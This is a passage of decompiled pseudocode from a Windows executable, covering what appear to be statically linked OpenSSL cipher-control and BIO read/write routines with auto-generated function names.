  v4 = (_DWORD *)sub_4073F0(a1);
  v5 = v4;
  if ( !v4[62] )
    return -1;
  if ( (int)v4[162] >= 0 )
    return sub_403610(a4, (int)a2, a1, (int)a3);
  if ( !v4[63] )
    return -1;
  if ( a3 )
  {
    if ( a2 )
    {
      v7 = a4;
      v9 = sub_432B60(a1) == 0;
      v10 = (void (__cdecl *)(char *, _BYTE *, int, int, int))v5[163];
      if ( v9 )
      {
        v12 = (int)(v5 + 64);
        if ( v10 )
          v8 = sub_40C6A0(v12, a3, a2, a4, v10);
        else
          v8 = sub_40C240(v12, a3, a2, a4);
      }
      else
      {
        v11 = (int)(v5 + 64);
        if ( v10 )
          v8 = sub_40C4A0(v11, a3, a2, a4, v10);
        else
          v8 = sub_40BFD0(v11, (int)a3, a2, a4);
      }
    }
    else
    {
      v7 = a4;
      v8 = sub_40BEE0((int)(v4 + 64), a3, a4);
    }
    if ( v8 )
      return -1;
    else
      return v7;
  }
  else
  {
    if ( sub_432B60(a1) )
    {
      v14 = (void *)sub_407440(a1);
      sub_40C970((int)(v5 + 64), v14, 0x10u);
      v5[160] = 16;
    }
    else
    {
      if ( (int)v5[160] < 0 )
        return -1;
      v15 = v5[160];
      v13 = (_BYTE *)sub_407440(a1);
      if ( sub_40C8A0((int)(v5 + 64), v13, v15) )
        return -1;
    }
    v5[63] = 0;
    return 0;
  }
}

//----- (00403920) --------------------------------------------------------
void *sub_403920()
{
  void *result; // eax

  result = &unk_4F0B34;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0B68;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00403940) --------------------------------------------------------
void *sub_403940()
{
  void *result; // eax

  result = &unk_4F0B9C;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0BD0;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00403960) --------------------------------------------------------
void *sub_403960()
{
  void *result; // eax

  result = &unk_4F0C04;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0C38;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00403980) --------------------------------------------------------
int __cdecl sub_403980(int a1, int a2, int a3, int a4)
{
  int v4; // esi
  int v5; // eax
  int v6; // ecx
  int v8; // ecx

  v4 = sub_4073F0(a1);
  if ( a2 != 8 )
  {
    if ( a2 )
      return -1;
    *(_DWORD *)(v4 + 496) = 0;
    *(_DWORD *)(v4 + 500) = 0;
    return 1;
  }
  v5 = sub_4073F0(a4);
  v6 = *(_DWORD *)(v4 + 496);
  if ( v6 )
  {
    if ( v6 != v4 )
      return 0;
    *(_DWORD *)(v5 + 496) = v5;
  }
  v8 = *(_DWORD *)(v4 + 500);
  if ( !v8 )
    return 1;
  if ( v8 != v4 + 248 )
    return 0;
  *(_DWORD *)(v5 + 500) = v5 + 248;
  return 1;
}

//----- (00403A10) --------------------------------------------------------
#error "403A81: call analysis failed (funcsize=116)"

//----- (00403B80) --------------------------------------------------------
BOOL __cdecl sub_403B80(int C, char *a2, char *a3, unsigned int a4)
{
  _DWORD *v4; // eax
  _DWORD *v5; // esi
  int *v6; // ebx
  int v7; // eax
  int *v9; // eax
  int v10; // [esp-8h] [ebp-14h]

  v4 = (_DWORD *)sub_4073F0(C);
  v5 = v4;
  v6 = v4 + 124;
  if ( !v4[124] || !v4[125] )
    return 0;
  if ( !a2 || !a3 || a4 < 0x10 )
    return 0;
  if ( v4[128] )
  {
    v7 = _tolower(C);
    ((void (__cdecl *)(char *, char *, unsigned int, int, _DWORD, int))v5[128])(a3, a2, a4, *v6, v5[125], v7);
    return 1;
  }
  v10 = sub_432B60(C);
  v9 = (int *)_tolower(C);
  return !sub_413CD0(v6, v9, a3, a2, a4, v10);
}

//----- (00403C50) --------------------------------------------------------
void *sub_403C50()
{
  void *result; // eax

  result = &unk_4F0C6C;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0CA0;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00403C70) --------------------------------------------------------
void *sub_403C70()
{
  void *result; // eax

  result = &unk_4F0CD4;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0D08;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00403C90) --------------------------------------------------------
int __cdecl sub_403C90(int C, int a2, size_t Size, _DWORD *Src)
{
  int v4; // esi
  int result; // eax
  int v6; // eax
  __int16 v7; // bx
  size_t v8; // eax
  void *v9; // eax
  int v10; // eax
  int v11; // ecx
  __int16 v12; // [esp+14h] [ebp+8h]

  v4 = sub_4073F0(C);
  switch ( a2 )
  {
    case 0:
      *(_DWORD *)(v4 + 248) = 0;
      *(_DWORD *)(v4 + 252) = 0;
      *(_DWORD *)(v4 + 256) = 0;
      *(_DWORD *)(v4 + 260) = 0;
      result = 1;
      *(_DWORD *)(v4 + 264) = 8;
      *(_DWORD *)(v4 + 268) = 12;
      *(_DWORD *)(v4 + 272) = -1;
      return result;
    case 8:
      v10 = sub_4073F0((int)Src);
      v11 = *(_DWORD *)(v4 + 324);
      if ( v11 )
      {
        if ( v11 != v4 )
          return 0;
        *(_DWORD *)(v10 + 324) = v10;
      }
      return 1;
    case 9:
      v8 = 15 - Size;
      goto LABEL_11;
    case 16:
      if ( !sub_432B60(C) || !*(_DWORD *)(v4 + 256) || !sub_40D390((unsigned __int8 *)(v4 + 280), Src, Size) )
        return 0;
      *(_DWORD *)(v4 + 256) = 0;
      *(_DWORD *)(v4 + 252) = 0;
      *(_DWORD *)(v4 + 260) = 0;
      return 1;
    case 17:
      if ( (Size & 1) != 0 || Size - 4 > 0xC )
        return 0;
      if ( sub_432B60(C) )
      {
        if ( Src )
          return 0;
      }
      else if ( Src )
      {
        *(_DWORD *)(v4 + 256) = 1;
        v9 = (void *)sub_407440(C);
        memcpy(v9, Src, Size);
      }
      *(_DWORD *)(v4 + 268) = Size;
      return 1;
    case 18:
      if ( Size != 4 )
        return 0;
      *(_DWORD *)_tolower(C) = *Src;
      return 1;
    case 20:
      v8 = Size;
LABEL_11:
      if ( v8 - 2 > 6 )
        return 0;
      *(_DWORD *)(v4 + 264) = v8;
      return 1;
    case 22:
      if ( Size != 13 )
        return 0;
      v6 = sub_407440(C);
      *(_DWORD *)v6 = *Src;
      *(_DWORD *)(v6 + 4) = Src[1];
      *(_DWORD *)(v6 + 8) = Src[2];
      *(_BYTE *)(v6 + 12) = *((_BYTE *)Src + 12);
      *(_DWORD *)(v4 + 272) = 13;
      v7 = *(unsigned __int8 *)(sub_407440(C) + 11) << 8;
      v12 = (v7 | *(unsigned __int8 *)(sub_407440(C) + 12)) - 8;
      if ( !sub_432B60(C) )
        v12 -= *(_WORD *)(v4 + 268);
      *(_BYTE *)(sub_407440(C) + 11) = HIBYTE(v12);
      *(_BYTE *)(sub_407440(C) + 12) = v12;
      return *(_DWORD *)(v4 + 268);
    default:
      return -1;
  }
}

//----- (00403F10) --------------------------------------------------------
#error "403F5A: call analysis failed (funcsize=73)"

//----- (00403FF0) --------------------------------------------------------
unsigned int __fastcall sub_403FF0(_DWORD *a1, _DWORD *a2, int C, unsigned int a4)
{
  int v6; // eax
  _DWORD *v7; // eax
  int v8; // eax
  unsigned int v9; // edi
  void *v10; // eax
  _BYTE *v11; // eax
  char *v12; // esi
  int *v13; // ebx
  bool v14; // zf
  int v15; // eax
  int v16; // eax
  int v18; // eax
  unsigned int v19; // [esp-8h] [ebp-30h]
  unsigned int v20; // [esp-4h] [ebp-2Ch]
  int v21; // [esp+10h] [ebp-18h]
  char v22[16]; // [esp+14h] [ebp-14h] BYREF

  v6 = sub_4073F0(C);
  v21 = v6;
  if ( a1 == a2 && a4 >= *(_DWORD *)(v6 + 268) + 8 )
  {
    if ( sub_432B60(C) )
    {
      v7 = (_DWORD *)sub_407440(C);
      *a1 = *v7;
      a1[1] = v7[1];
    }
    v8 = _tolower(C);
    *(_DWORD *)(v8 + 4) = *a2;
    *(_DWORD *)(v8 + 8) = a2[1];
    v9 = -8 - *(_DWORD *)(v21 + 268) + a4;
    v19 = 15 - *(_DWORD *)(v21 + 264);
    v10 = (void *)_tolower(C);
    if ( !sub_40CA00((char *)(v21 + 280), v10, v19, v9) )
    {
      v20 = *(_DWORD *)(v21 + 272);
      v11 = (_BYTE *)sub_407440(C);
      sub_40CA70(v21 + 280, v11, v20);
      v12 = (char *)(a2 + 2);
      v13 = a1 + 2;
      v14 = sub_432B60(C) == 0;
      v15 = *(_DWORD *)(v21 + 328);
      if ( v14 )
      {
        if ( v15 )
          v18 = sub_40D1E0(
                  v21 + 280,
                  (int)v12,
                  (int)v13,
                  v9,
                  *(int (__cdecl **)(int, int, unsigned int, int, int, int))(v21 + 328));
        else
          v18 = sub_40CD90((char *)(v21 + 280), v12, v13, v9);
        if ( !v18
          && sub_40D390((unsigned __int8 *)(v21 + 280), v22, *(_DWORD *)(v21 + 268))
          && !sub_413A50(v22, &v12[v9], *(_DWORD *)(v21 + 268)) )
        {
          return v9;
        }
        sub_4139E0(v13, v9);
      }
      else
      {
        if ( v15 )
          v16 = sub_40CFE0(
                  v21 + 280,
                  (int)v12,
                  (int)v13,
                  v9,
                  *(int (__cdecl **)(int, int, unsigned int, int, int, int))(v21 + 328));
        else
          v16 = sub_40CB30((char *)(v21 + 280), v12, v13, v9);
        if ( !v16 && sub_40D390((unsigned __int8 *)(v21 + 280), (char *)v13 + v9, *(_DWORD *)(v21 + 268)) )
          return *(_DWORD *)(v21 + 268) + v9 + 8;
      }
    }
  }
  return -1;
}

//----- (00404210) --------------------------------------------------------
unsigned int __cdecl sub_404210(int C, int *a2, char *a3, int a4)
{
  _DWORD *v4; // eax
  _DWORD *v5; // esi
  char *v6; // ebx
  unsigned int result; // eax
  void *v8; // eax
  void *v9; // eax
  bool v10; // zf
  int (__cdecl *v11)(int, int, unsigned int, int, int, int); // eax
  int v12; // eax
  int v13; // eax
  _BYTE *v14; // eax
  int v15; // ebx
  unsigned int v16; // [esp-8h] [ebp-38h]
  unsigned int v17; // [esp-8h] [ebp-38h]
  int v18; // [esp-4h] [ebp-34h]
  char v19[16]; // [esp+1Ch] [ebp-14h] BYREF

  v4 = (_DWORD *)sub_4073F0(C);
  v5 = v4;
  v6 = (char *)(v4 + 70);
  if ( !v4[62] )
    return -1;
  if ( (int)v4[68] >= 0 )
    return sub_403FF0(a2, a3, C, a4);
  if ( !v4[63] || !sub_432B60(C) && !v5[64] )
    return -1;
  if ( a2 )
  {
    if ( !a3 )
      return 0;
    if ( !v5[65] )
    {
      v17 = 15 - v5[66];
      v9 = (void *)_tolower(C);
      if ( sub_40CA00(v6, v9, v17, a4) )
        return -1;
      v5[65] = 1;
    }
    v10 = sub_432B60(C) == 0;
    v11 = (int (__cdecl *)(int, int, unsigned int, int, int, int))v5[82];
    if ( !v10 )
    {
      if ( v11 )
        v12 = sub_40CFE0((int)v6, (int)a3, (int)a2, a4, (int (__cdecl *)(int, int, unsigned int, int, int, int))v5[82]);
      else
        v12 = sub_40CB30(v6, a3, a2, a4);
      if ( v12 )
        return -1;
      result = a4;
      v5[64] = 1;
      return result;
    }
    if ( v11 )
      v13 = sub_40D1E0((int)v6, (int)a3, (int)a2, a4, v11);
    else
      v13 = sub_40CD90(v6, a3, a2, a4);
    if ( v13
      || !sub_40D390((unsigned __int8 *)v6, v19, v5[67])
      || (v18 = v5[67], v14 = (_BYTE *)sub_407440(C), sub_413A50(v19, v14, v18)) )
    {
      v15 = -1;
    }
    else
    {
      v15 = a4;
      if ( a4 != -1 )
      {
LABEL_36:
        v5[63] = 0;
        v5[64] = 0;
        v5[65] = 0;
        return v15;
      }
    }
    sub_4139E0(a2, a4);
    goto LABEL_36;
  }
  if ( !a3 )
  {
    v16 = 15 - v5[66];
    v8 = (void *)_tolower(C);
    if ( !sub_40CA00(v6, v8, v16, a4) )
    {
      v5[65] = 1;
      return a4;
    }
    return -1;
  }
  if ( !v5[65] && a4 )
    return -1;
  sub_40CA70((int)v6, a3, a4);
  return a4;
}

//----- (004044D0) --------------------------------------------------------
void *sub_4044D0()
{
  void *result; // eax

  result = &unk_4F0D3C;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0D70;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (004044F0) --------------------------------------------------------
void *sub_4044F0()
{
  void *result; // eax

  result = &unk_4F0DA4;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0DD8;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00404510) --------------------------------------------------------
void *sub_404510()
{
  void *result; // eax

  result = &unk_4F0E0C;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0E40;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00404530) --------------------------------------------------------
int __cdecl sub_404530(int C, int a2, void *Src)
{
  int v3; // edi
  int v5; // eax
  int v6; // eax
  void *v7; // eax
  int v8; // [esp-4h] [ebp-14h]

  v3 = sub_4073F0(C);
  if ( Src )
  {
    if ( !a2 )
      goto LABEL_10;
  }
  else if ( !a2 )
  {
    return 1;
  }
  if ( sub_432B60(C) )
  {
    v5 = sub_407470(C);
    sub_4117D0(a2, 8 * v5, v3);
  }
  else
  {
    v6 = sub_407470(C);
    sub_4117E0(a2, 8 * v6, v3);
  }
  if ( !Src )
  {
    *(_DWORD *)(v3 + 248) = 0;
    return 1;
  }
LABEL_10:
  v8 = sub_407410(C);
  v7 = (void *)_tolower(C);
  memcpy(v7, Src, v8);
  *(_DWORD *)(v3 + 248) = _tolower(C);
  return 1;
}
// 4117D0: using guessed type int __cdecl sub_4117D0(_DWORD, _DWORD, _DWORD);
// 4117E0: using guessed type _DWORD __cdecl sub_4117E0(_DWORD, _DWORD, _DWORD);

//----- (004045F0) --------------------------------------------------------
size_t __cdecl sub_4045F0(int a1, int *a2, void *Src, size_t Size)
{
  int v4; // esi
  size_t result; // eax
  size_t v6; // ebx
  int v7; // eax
  BOOL v8; // [esp+Ch] [ebp-4h]

  v4 = sub_4073F0(a1);
  v8 = sub_407410(a1) == 4;
  if ( !Src )
    return 0;
  v6 = Size;
  if ( !Size || !sub_432B60(a1) && (Size < 0x10 || (Size & 7) != 0) || !v8 && (Size & 7) != 0 )
    return -1;
  if ( !a2 )
  {
    if ( !sub_432B60(a1) )
      return Size - 8;
    if ( v8 )
      v6 = 8 * ((Size + 7) >> 3);
    return v6 + 8;
  }
  v7 = sub_432B60(a1);
  if ( v8 )
    result = v7
           ? sub_4143A0(v4, *(int **)(v4 + 248), a2, Src, Size, (void (__cdecl *)(int *, int *, int))sub_40F780)
           : sub_4144E0(v4, *(_BYTE **)(v4 + 248), a2, Src, Size, (void (__cdecl *)(int *, int *, int))sub_410DC0);
  else
    result = v7
           ? sub_414080(v4, *(int **)(v4 + 248), a2, Src, Size, (void (__cdecl *)(int *, int *, int))sub_40F780)
           : sub_414300(
               v4,
               *(_BYTE **)(v4 + 248),
               (char *)a2,
               (int *)Src,
               Size,
               (void (__cdecl *)(int *, int *, int))sub_410DC0);
  if ( !result )
    return -1;
  return result;
}

//----- (00404730) --------------------------------------------------------
void *sub_404730()
{
  return &unk_4F0E74;
}

//----- (00404740) --------------------------------------------------------
void *sub_404740()
{
  return &unk_4F0EA8;
}

//----- (00404750) --------------------------------------------------------
void *sub_404750()
{
  return &unk_4F0EDC;
}

//----- (00404760) --------------------------------------------------------
void *sub_404760()
{
  return &unk_4F0F10;
}

//----- (00404770) --------------------------------------------------------
void *sub_404770()
{
  return &unk_4F0F44;
}

//----- (00404780) --------------------------------------------------------
void *sub_404780()
{
  return &unk_4F0F78;
}

//----- (00404790) --------------------------------------------------------
int __cdecl sub_404790(int C, int a2, size_t Size, void *Src)
{
  _DWORD *v4; // esi
  int v6; // eax

  v4 = (_DWORD *)sub_4073F0(C);
  switch ( a2 )
  {
    case 0:
      v4[124] = 0;
      v4[125] = 0;
      v4[183] = sub_407410(C);
      v4[168] = _tolower(C);
      v4[181] = 0;
      v4[182] = 0;
      v4[184] = 16;
      return 1;
    case 8:
      v6 = sub_4073F0((int)Src);
      return sub_40D750((_DWORD *)(v6 + 504), (int)(v4 + 126), v6, v6 + 248);
    case 9:
      if ( Size - 1 > 0xE )
        return 0;
      v4[183] = Size;
      return 1;
    case 16:
      if ( Size != v4[184] || !sub_432B60(C) )
        return 0;
      memcpy(Src, v4 + 169, Size);
      return 1;
    case 17:
      if ( Src )
      {
        if ( Size == v4[184] && !sub_432B60(C) )
        {
          memcpy(v4 + 169, Src, Size);
          return 1;
        }
      }
      else if ( Size <= 0x10 )
      {
        v4[184] = Size;
        return 1;
      }
      return 0;
    default:
      return -1;
  }
}

//----- (00404920) --------------------------------------------------------
#error "404971: call analysis failed (funcsize=150)"

//----- (00404AC0) --------------------------------------------------------
int __cdecl sub_404AC0(int a1, int a2, char *Src, size_t Size)
{
  int v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // esi
  int result; // eax
  char *v8; // ebp
  int v9; // eax
  size_t v10; // edi
  int v11; // ebx
  int v12; // ebx
  int v13; // esi
  int v14; // edx
  bool v15; // zf
  char *v16; // [esp+Ch] [ebp-Ch]
  int v17; // [esp+10h] [ebp-8h]
  int *v18; // [esp+14h] [ebp-4h]

  v4 = 0;
  v17 = 0;
  v5 = (_DWORD *)sub_4073F0(a1);
  v6 = v5;
  if ( !v5[125] || !v5[124] )
    return -1;
  v8 = Src;
  if ( !Src )
  {
    if ( v5[181] )
    {
      if ( sub_432B60(a1) )
      {
        if ( !sub_40DBA0((int)(v6 + 126), (int)(v6 + 173), a2, v6[181]) )
          return -1;
      }
      else if ( !sub_40DEC0((int)(v6 + 126), (int)(v6 + 173), a2, v6[181]) )
      {
        return -1;
      }
      v14 = v6[181];
      v6[181] = 0;
      v4 = v14;
    }
    if ( v6[182] )
    {
      if ( !sub_40D960((int)(v6 + 126), (int)(v6 + 177), v6[182]) )
        return -1;
      v6[182] = 0;
    }
    if ( sub_432B60(a1) )
    {
      v15 = sub_40E2F0((int)(v6 + 126), v6 + 169, 0x10u) == 1;
    }
    else
    {
      if ( (int)v6[184] < 0 )
        return -1;
      v15 = sub_40E1E0((int)(v6 + 126), (_BYTE *)v6 + 676, v6[184]) == 0;
    }
    if ( v15 )
    {
      result = v4;
      v6[125] = 0;
      return result;
    }
    return -1;
  }
  if ( a2 )
  {
    v16 = (char *)(v5 + 173);
    v18 = v5 + 181;
  }
  else
  {
    v16 = (char *)(v5 + 177);
    v18 = v5 + 182;
  }
  v9 = *v18;
  v10 = Size;
  if ( *v18 )
  {
    v11 = 16 - v9;
    if ( 16 - v9 > Size )
    {
      memcpy(&v16[v9], Src, Size);
      *v18 += Size;
      return 0;
    }
    memcpy(&v16[v9], Src, 16 - v9);
    v10 = Size - v11;
    v8 = &Src[v11];
    if ( a2 )
    {
      if ( sub_432B60(a1) )
      {
        if ( !sub_40DBA0((int)(v6 + 126), (int)v16, a2, 0x10u) )
          return -1;
      }
      else if ( !sub_40DEC0((int)(v6 + 126), (int)v16, a2, 0x10u) )
      {
        return -1;
      }
    }
    else if ( !sub_40D960((int)(v6 + 126), (int)v16, 0x10u) )
    {
      return -1;
    }
    v17 = 16;
    *v18 = 0;
  }
  v12 = v10 & 0xF;
  if ( v10 != v12 )
  {
    if ( !a2 )
    {
      if ( !sub_40D960((int)(v6 + 126), (int)v8, v10 - v12) )
        return -1;
      goto LABEL_27;
    }
    v13 = (int)(v6 + 126);
    if ( sub_432B60(a1) )
    {
      if ( !sub_40DBA0(v13, (int)v8, a2, v10 - v12) )
        return -1;
      goto LABEL_27;
    }
    if ( sub_40DEC0(v13, (int)v8, a2, v10 - v12) )
    {
LABEL_27:
      v17 += v10 - v12;
      v8 += v10 - v12;
      goto LABEL_28;
    }
    return -1;
  }
LABEL_28:
  if ( (v10 & 0xF) != 0 )
  {
    memcpy(v16, v8, v12);
    *v18 = v12;
  }
  return v17;
}

//----- (00404DF0) --------------------------------------------------------
int __cdecl sub_404DF0(int a1)
{
  int v1; // eax

  v1 = sub_4073F0(a1);
  sub_40E330(v1 + 504);
  return 1;
}

//----- (00404E10) --------------------------------------------------------
void *sub_404E10()
{
  void *result; // eax

  result = &unk_4F0FAC;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F0FE0;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00404E30) --------------------------------------------------------
void *sub_404E30()
{
  void *result; // eax

  result = &unk_4F1014;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F1048;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00404E50) --------------------------------------------------------
void *sub_404E50()
{
  void *result; // eax

  result = &unk_4F107C;
  if ( (dword_73C6D4 & 0x2000000) == 0 )
    return &unk_4F10B0;
  return result;
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (00404E70) --------------------------------------------------------
int __cdecl sub_404E70(int a1)
{
  void *v1; // eax
  int v2; // esi
  struct _RTL_CRITICAL_SECTION *v4; // eax
  int (__cdecl *v5)(int); // eax

  v1 = sub_413430(0x48u);
  v2 = (int)v1;
  if ( !v1 )
  {
    sub_408310(32, 108, 65, (int)"crypto\\bio\\bio_lib.c", 21);
    return 0;
  }
  *(_DWORD *)v1 = a1;
  *((_DWORD *)v1 + 4) = 1;
  *((_DWORD *)v1 + 11) = 1;
  if ( !sub_414B00(0xCu, (int)v1, (int **)v1 + 16) )
    goto LABEL_9;
  v4 = sub_414650();
  *(_DWORD *)(v2 + 68) = v4;
  if ( !v4 )
  {
    sub_408310(32, 108, 65, (int)"crypto\\bio\\bio_lib.c", 34);
    sub_414DC0(0xCu, v2, (int **)(v2 + 64));
LABEL_9:
    sub_413490((void *)v2);
    return 0;
  }
  v5 = *(int (__cdecl **)(int))(a1 + 28);
  if ( v5 && !v5(v2) )
  {
    sub_408310(32, 108, 70, (int)"crypto\\bio\\bio_lib.c", 40);
    sub_414DC0(0xCu, v2, (int **)(v2 + 64));
    sub_4146D0(*(LPCRITICAL_SECTION *)(v2 + 68));
    goto LABEL_9;
  }
  return v2;
}

//----- (00404F50) --------------------------------------------------------
int __cdecl sub_404F50(volatile LONG *Block)
{
  volatile LONG *v1; // esi
  int result; // eax
  int (__cdecl *v3)(volatile LONG *, int, _DWORD, _DWORD, _DWORD, int); // eax
  void (__cdecl *v4)(volatile LONG *); // eax

  v1 = Block;
  if ( !Block || sub_4147E0(Block + 11, -1, &Block) <= 0 )
    return 0;
  if ( (int)Block > 0 )
    return 1;
  v3 = (int (__cdecl *)(volatile LONG *, int, _DWORD, _DWORD, _DWORD, int))*((_DWORD *)v1 + 1);
  if ( !v3 || (result = v3(v1, 1, 0, 0, 0, 1), Block = (volatile LONG *)result, result > 0) )
  {
    if ( *v1 )
    {
      v4 = *(void (__cdecl **)(volatile LONG *))(*v1 + 32);
      if ( v4 )
        v4(v1);
    }
    sub_414DC0(0xCu, (int)v1, (int **)v1 + 16);
    sub_4146D0(*((LPCRITICAL_SECTION *)v1 + 17));
    sub_413490((void *)v1);
    return 1;
  }
  return result;
}

//----- (00404FE0) --------------------------------------------------------
int __cdecl sub_404FE0(int a1, int a2)
{
  int result; // eax

  result = a2;
  *(_DWORD *)(a1 + 32) = a2;
  return result;
}

//----- (00404FF0) --------------------------------------------------------
int __cdecl sub_404FF0(int a1)
{
  return *(_DWORD *)(a1 + 32);
}

//----- (00405000) --------------------------------------------------------
int __cdecl sub_405000(int a1, int a2)
{
  int result; // eax

  result = a2;
  *(_DWORD *)(a1 + 12) = a2;
  return result;
}

//----- (00405010) --------------------------------------------------------
int __cdecl sub_405010(int a1, int a2)
{
  int result; // eax

  result = a1;
  *(_DWORD *)(a1 + 20) &= ~a2;
  return result;
}

//----- (00405020) --------------------------------------------------------
int __cdecl sub_405020(int a1, int a2)
{
  return a2 & *(_DWORD *)(a1 + 20);
}

//----- (00405030) --------------------------------------------------------
int __cdecl sub_405030(int a1, int a2)
{
  int result; // eax

  result = a1;
  *(_DWORD *)(a1 + 20) |= a2;
  return result;
}

//----- (00405040) --------------------------------------------------------
int __cdecl sub_405040(int a1, int a2, int a3)
{
  int (__cdecl *v3)(int, int, int, int, _DWORD, int); // edi
  int result; // eax
  int v5; // eax
  int v6; // ecx

  if ( a1 && *(_DWORD *)a1 && *(_DWORD *)(*(_DWORD *)a1 + 12) )
  {
    v3 = *(int (__cdecl **)(int, int, int, int, _DWORD, int))(a1 + 4);
    if ( !v3 || (result = v3(a1, 2, a2, a3, 0, 1), result > 0) )
    {
      if ( *(_DWORD *)(a1 + 12) )
      {
        v5 = (*(int (__cdecl **)(int, int, int))(*(_DWORD *)a1 + 12))(a1, a2, a3);
        v6 = v5;
        if ( v5 > 0 )
          *(_QWORD *)(a1 + 48) += v5;
        if ( v3 )
          return v3(a1, 130, a2, a3, 0, v5);
        return v6;
      }
      else
      {
        sub_408310(32, 111, 120, (int)"crypto\\bio\\bio_lib.c", 193);
        return -2;
      }
    }
  }
  else
  {
    sub_408310(32, 111, 121, (int)"crypto\\bio\\bio_lib.c", 183);
    return -2;
  }
  return result;
}

//----- (00405110) --------------------------------------------------------
int __cdecl sub_405110(int a1, int a2, int a3)
{
  int result; // eax
  int (__cdecl *v4)(int, int, int, int, _DWORD, int); // edi
  int v5; // eax
  int v6; // ecx

  if ( !a1 )
    return 0;
  v4 = *(int (__cdecl **)(int, int, int, int, _DWORD, int))(a1 + 4);
  if ( *(_DWORD *)a1 && *(_DWORD *)(*(_DWORD *)a1 + 8) )
  {
    if ( !v4 || (result = v4(a1, 3, a2, a3, 0, 1), result > 0) )
    {
      if ( *(_DWORD *)(a1 + 12) )
      {
        v5 = (*(int (__cdecl **)(int, int, int))(*(_DWORD *)a1 + 8))(a1, a2, a3);
        v6 = v5;
        if ( v5 > 0 )
          *(_QWORD *)(a1 + 56) += v5;
        if ( v4 )
          return v4(a1, 131, a2, a3, 0, v5);
        return v6;
      }
      else
      {
        sub_408310(32, 113, 120, (int)"crypto\\bio\\bio_lib.c", 226);
        return -2;
      }
    }
  }
  else
  {
    sub_408310(32, 113, 121, (int)"crypto\\bio\\bio_lib.c", 217);
    return -2;
  }
  return result;
}

//----- (004051D0) --------------------------------------------------------
int __cdecl sub_4051D0(int a1, int a2)
{
  int (__cdecl *v2)(int, int, int, _DWORD, _DWORD, int); // edi
  int result; // eax
  int v4; // eax
  int v5; // ecx

  if ( a1 && *(_DWORD *)a1 && *(_DWORD *)(*(_DWORD *)a1 + 16) )
  {
    v2 = *(int (__cdecl **)(int, int, int, _DWORD, _DWORD, int))(a1 + 4);
    if ( !v2 || (result = v2(a1, 4, a2, 0, 0, 1), result > 0) )
    {
      if ( *(_DWORD *)(a1 + 12) )
      {
        v4 = (*(int (__cdecl **)(int, int))(*(_DWORD *)a1 + 16))(a1, a2);
        v5 = v4;
        if ( v4 > 0 )
          *(_QWORD *)(a1 + 56) += v4;
        if ( v2 )
          return v2(a1, 132, a2, 0, 0, v4);
        return v5;
      }
      else
      {
        sub_408310(32, 110, 120, (int)"crypto\\bio\\bio_lib.c", 256);
        return -2;
      }
    }
  }
  else
  {
    sub_408310(32, 110, 121, (int)"crypto\\bio\\bio_lib.c", 246);
    return -2;
  }
  return result;
}

//----- (00405290) --------------------------------------------------------
int __cdecl sub_405290(_DWORD *a1, int a2, int a3)
{
  int (__cdecl *v3)(_DWORD *, int, int, int, _DWORD, int); // edi
  int result; // eax

  if ( a1 && *a1 && *(_DWORD *)(*a1 + 20) )
  {
    v3 = (int (__cdecl *)(_DWORD *, int, int, int, _DWORD, int))a1[1];
    if ( !v3 || (result = v3(a1, 5, a2, a3, 0, 1), result > 0) )
    {
      if ( a1[3] )
      {
        result = (*(int (__cdecl **)(_DWORD *, int, int))(*a1 + 20))(a1, a2, a3);
        if ( v3 )
          return v3(a1, 133, a2, a3, 0, result);
      }
      else
      {
        sub_408310(32, 104, 120, (int)"crypto\\bio\\bio_lib.c", 286);
        return -2;
      }
    }
  }
  else
  {
    sub_408310(32, 104, 121, (int)"crypto\\bio\\bio_lib.c", 276);
    return -2;
  }
  return result;
}

//----- (00405340) --------------------------------------------------------
int __cdecl sub_405340(int a1, int a2, int a3)
{
  int v3; // esi

  v3 = a2;
  if ( a2 < 0 )
    v3 = 0;
  if ( v3 > a3 )
    v3 = a3;
  if ( !v3 )
    return 1;
  while ( 1 )
  {
    --v3;
    if ( sub_4051D0(a1, (int)" ") != 1 )
      break;
    if ( !v3 )
      return 1;
  }
  return 0;
}

//----- (00405390) --------------------------------------------------------
int __cdecl sub_405390(_DWORD *a1, int a2, int a3, int a4)
{
  int result; // eax
  int (__cdecl *v5)(_DWORD *, int, int, int, int, int); // edi

  if ( !a1 )
    return 0;
  if ( *a1 && *(_DWORD *)(*a1 + 24) )
  {
    v5 = (int (__cdecl *)(_DWORD *, int, int, int, int, int))a1[1];
    if ( !v5 || (result = v5(a1, 6, a4, a2, a3, 1), result > 0) )
    {
      result = (*(int (__cdecl **)(_DWORD *, int, int, int))(*a1 + 24))(a1, a2, a3, a4);
      if ( v5 )
        return v5(a1, 134, a4, a2, a3, result);
    }
  }
  else
  {
    sub_408310(32, 103, 121, (int)"crypto\\bio\\bio_lib.c", 336);
    return -2;
  }
  return result;
}

//----- (004054B0) --------------------------------------------------------
_DWORD *__cdecl sub_4054B0(_DWORD *a1, int a2)
{
  int v3; // ecx
  int v4; // eax
  bool v5; // zf

  if ( !a1 )
    return (_DWORD *)a2;
  v3 = (int)(a1 + 9);
  v4 = (int)a1;
  if ( a1[9] )
  {
    do
    {
      v4 = *(_DWORD *)v3;
